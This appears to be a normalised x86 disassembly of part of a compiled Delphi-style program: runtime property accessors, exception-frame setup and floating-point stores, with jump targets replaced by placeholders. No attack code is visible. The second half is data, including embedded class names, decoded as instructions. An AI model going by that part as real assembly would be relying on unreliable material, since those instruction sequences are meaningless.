pop ebx
retn
mov edx esi
mov eax ebx
call sub_410738
mov edx [ rw-data ]
mov eax esi
call sub_407c68
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407c68
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407fd8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_4107e8
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410858
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4108cc
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_410928
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_41097c
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404258
mov ecx esp
mov edx esi
mov eax ebx
call sub_410928
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_4109c4
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_4109b0
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410a04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_410a4c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4047e8
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_410a88
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a53
lea eax [ ebp - 0x4 ]
call sub_40469c
retn
sub_410a5c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_41097c
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_4109c4
pop ebx
retn
dec bl
je r-xdata
call sub_410a04
jmp r-xdata
pop ebx
retn
sub_410a88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_410b4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404244
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_410a5c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b55
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4046d8
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410b5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_41072c
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_410ba4 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410cd3 ]
jmp [ eax * 4 + jump_table_410c40 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_410d68
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_410d54
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_410da8
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_410de0
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_410e1c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405640
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_410e90
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410ed6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410edd
retn
mov eax rw-data
call sub_403fbc
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a44
sub_410ee8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410f0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410f14
retn
sub_41110c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
adc [ ecx ] eax
or al 0x0
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or al 0x45
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
adc al [ ecx ]
or al 0x0
outsd
jb r-xdata
add [ eax ] al
add [ ebx + edx ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edx [ edx ]
inc ecx
add [ eax + eax ] cl
add [ eax ] al
or [ ecx ] dl
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
outsd
jb r-xdata
add [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + 0x4111 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004111 ] dh
add [ eax ] al
add [ eax ] cl
adc [ ecx ] eax
mov ah 0x34
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc [ ebp + 0x46 ] al
mov esp 0x4004034
xor al [ eax ]
and [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] bl
add [ edx ] cl
inc ebp
push edx
popad
inc ebp
jb r-xdata
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or al [ ebp + 0x52 ]
imul ebp [ ebp + 0x53 ] 0x61657274
insd
inc ebp
jb r-xdata
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] dl
inc ebp
inc esi
shr [ edx + edx + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
adc al [ ecx ]
or al 0x0
add ah dh
adc [ eax ] al
lea eax [ eax ]
push esp
adc [ ecx ] eax
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
add [ eax ] al
adc [ fs : ecx ] eax
mov ah 0x34
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or eax [ ebp + 0x46 ]
dec edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
adc eax [ ecx ]
or al 0x0
add [ eax ] al
js r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
jb r-xdata
insd
inc ebp
jb r-xdata
add [ edx + esi + 0x40 ] bl
add [ eax * 2 + 0x65727453 ] cl
popad
add [ eax ] al
adc [ fs : ecx ] eax
mov ah 0x34
inc eax
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or eax 0x72434645
popad
je r-xdata
inc eax
add [ eax ] dl
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx ] dl
inc ecx
add [ eax + eax ] cl
mov esp 0x4004034
xor al [ eax ]
and [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi ] cl
inc ebp
inc ebx
insb
popad
jae r-xdata
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
push cs
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or eax [ ebp + 0x46 ]
imul ebp [ ebp + 0x72 ] 0x6f727245
jb r-xdata
add al 0x32
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x13
outsd
jb r-xdata
add [ eax ] al
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx + 0x41 ] dh
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx + 0x41 ] ch
add [ eax + eax ] cl
adc al [ ecx ]
add [ eax ] al
and [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax * 2 + 0x4e736552 ] cl
fcom [ ecx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
adc al 0x41
xor al [ eax ]
outsd
jne r-xdata
mov esp 0x4004034
xor al [ eax ]
and [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx ] cl
inc ebp
push edi
jb r-xdata
inc ecx
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or eax [ ebp + 0x57 ]
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or al [ ebp + 0x4c ]
add [ edx + esi ] al
outsd
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x7473694c
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + eax * 2 ] dl
add [ eax + eax ] cl
nop
sub [ ecx + eax * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
adc al 0x41
add [ eax + eax ] cl
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or al 0x45
push edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + eax ] cl
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcom [ ecx + eax * 2 ]
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
lea eax [ eax ]
test [ ecx + eax * 2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx + 0xc0041 ] al
xor al [ eax ]
pop esp
xor al [ eax ]
adc [ ebp + 0x49 ] eax
push dx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
adc eax 0x100041
add [ eax ] al
mov al 0x6f
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax + 0x5c0040b5 ] ah
outsd
jb r-xdata
imul esi [ ebx + 0x74 ] 0x6f727245
jb r-xdata
and [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] bl
add [ edx ] cl
inc ebp
dec esp
outsd
je r-xdata
add [ eax ] al
inc ebp
jb r-xdata
add [ eax + 0x1c004138 ] ah
cmp [ ecx ] eax
add eax 0x73694c54
je r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x74617265
imul ebp [ edi + 0x6e ] 0x16acc08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
dec esp
cmp [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x10004116
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
jne r-xdata
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
or al [ ebp + 0x42 ]
imul esi [ ebx + esi * 2 + 0x45 ] 0x726f7272
nop
xor al 0x15
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0041 ] dh
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc [ ebp + 0x53 ] al
je r-xdata
inc eax
add [ ebp + edx + 0x41 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
adc eax 0xc0041
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
cmovne eax [ ebx + 0x6f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ecx + eax * 2 ] dl
outsd
jb r-xdata
outsb
jbe r-xdata
dec ecx
rcl [ eax ] 0x17
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
pop ss
inc ecx
add [ eax + eax ] ah
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
xor [ ecx + eax * 2 ] bh
add [ ebx ] cl
push esp
push esp
push 0x64616572
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc004117
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
movsb [ edi ] [ esi ]
cmp eax 0x54050041
inc edx
imul esi [ ebx + esi * 2 - 0x75 ] 0x4117bcc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
pop ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
pop ss
inc ecx
add dh dl
pop ss
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop eax
aas
inc ecx
add [ eax + 0x40 ] ch
inc ecx
add [ eax + 0x40 ] dh
inc ecx
add [ edi + edi + 0x20041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x100041 ] bh
add [ eax ] al
mov al [ 0xffffffffb4004010 ]
arpl [ ebp + 0x73 ] sp
dec esp
push ss
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx + 0x41 ] cl
add [ eax + eax ] cl
add [ eax ] al
in al dx
outsb
inc eax
add [ esp + esi + 0x34c00040 ] dh
inc eax
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x12 ] bh
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
xor al [ eax ]
cmovne ecx [ edi + 0x75 ]
je r-xdata
xor al [ eax ]
mov al [ 0x5c0040b5 ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
push ss
inc ecx
outsd
jb r-xdata
insd
jo r-xdata
inc ebp
inc ebx
outsd
adc eax 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
